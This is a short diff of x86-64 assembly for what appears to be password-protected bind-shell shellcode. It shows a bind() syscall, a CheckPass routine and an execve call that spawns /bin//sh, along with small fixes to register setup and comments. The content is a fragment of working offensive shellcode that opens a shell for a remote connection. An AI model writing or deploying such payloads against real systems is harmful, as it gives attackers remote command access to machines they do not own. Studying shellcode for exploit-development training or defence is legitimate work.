@@ -51,7 +51,7 @@ _start:
      not rbx
      push rbx
      push rsp  ; save rsp value into the stack , needed for rsi later
-
+     pop rsi   ; retrieve value of rsp  pushed into the stack before
 
     ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
     ; syscall number 49
@@ -59,7 +59,6 @@ _start:
 
     push byte 0x31 ; (49)
     pop rax
-    pop rsi        ; retrieve value of rsp  pushed into the stack before
     push byte 0x10  ; (16 bytes) sockaddr_len
     pop rdx
     syscall
@@ -143,13 +142,13 @@ CheckPass:
 
 
 
-   Execve:                                     	; Execve format  , execve("/bin/sh", 0 , 0)
+   Execve:                                     	; Execve format  , execve("/bin//sh", 0 , 0)
         xor rsi , rsi
         mul rsi                                 ; zeroed rax , rdx register
         push ax                                 ; terminate string with null
         mov rbx , 0x68732f2f6e69622f     	; "/bin//sh"  in reverse order
         push rbx
-        push rsp
+        push rsp			        ; set RDI ("/bin//sh")
         pop rdi
         push byte 0x3b    ; execve syscall number (59)
         pop rax
